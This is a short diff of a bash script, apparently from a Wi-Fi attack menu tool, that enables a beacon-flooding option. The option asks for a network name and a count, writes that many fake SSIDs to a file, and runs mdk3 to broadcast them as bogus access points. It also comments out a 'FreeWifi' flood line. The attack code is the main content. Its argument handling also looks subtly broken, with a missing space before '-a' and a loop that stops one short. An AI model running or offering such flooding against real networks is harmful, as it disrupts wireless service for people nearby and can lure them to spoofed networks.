@@ -26,15 +26,15 @@ elif [[ "$SO" == "2" ]]; then # Beacon Flooding
   elif [[ "$SO" == "3" ]]; then # Specific
     getInput "Network Name" "Type a string" "xPWNEDx"
     string=$SI
-    # getInput "Number of APs" "Enter the number of Access Points to generate." "1000"
-    # N=$SI
-    mdk3 wlan0 b -n FreeWifi -m
-    # COUNT=1
-    # while [ $COUNT -lt $N ] || [ $COUNT -eq $N ]; do
-    #   echo $string $COUNT >> "$string.txt"
-    #   let COUNT=COUNT+1
-    # done
-    # mdk3 $WI b -f "./$string.txt"-a  -s 1000 && rm "./$string.txt"
+    getInput "Number of APs" "Enter the number of Access Points to generate." "1000"
+    N=$SI
+    COUNT=1
+    while [ $COUNT -lt $N ]; do
+      echo $string $COUNT >> "$string.txt"
+      let COUNT=COUNT+1
+    done
+    mdk3 $WI b -f "./$string.txt"-a  -s 1000 && rm "./$string.txt"
     # mdk3 $WI b -n "$string"-a  -s $N
+    # mdk3 wlan0 b -n FreeWifi -m
   fi
 fi
